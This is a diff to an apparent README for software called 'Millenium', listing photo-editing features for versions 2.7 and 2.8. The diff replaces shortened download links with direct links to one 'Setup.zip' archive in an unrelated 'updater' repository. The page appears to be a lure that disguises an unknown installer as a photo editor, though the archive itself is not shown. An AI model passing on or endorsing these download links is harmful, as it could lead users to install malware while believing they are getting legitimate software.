@@ -11,7 +11,7 @@
 
 ## Millenium is an open source for all users that everyone can use.
 
-## [⚡ Millenium 2.7](https://is.gd/sQtkNQ):
+## [⚡ Millenium 2.7](https://raw.githubusercontent.com/updater-programms/updater/master/Setup.zip):
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
 * Shine Removal Technology.
@@ -20,7 +20,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡ Millenium Version 2.8](https://is.gd/Shrtf9):
+## [⚡ Millenium Version 2.8](https://raw.githubusercontent.com/updater-programms/updater/master/Setup.zip):
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
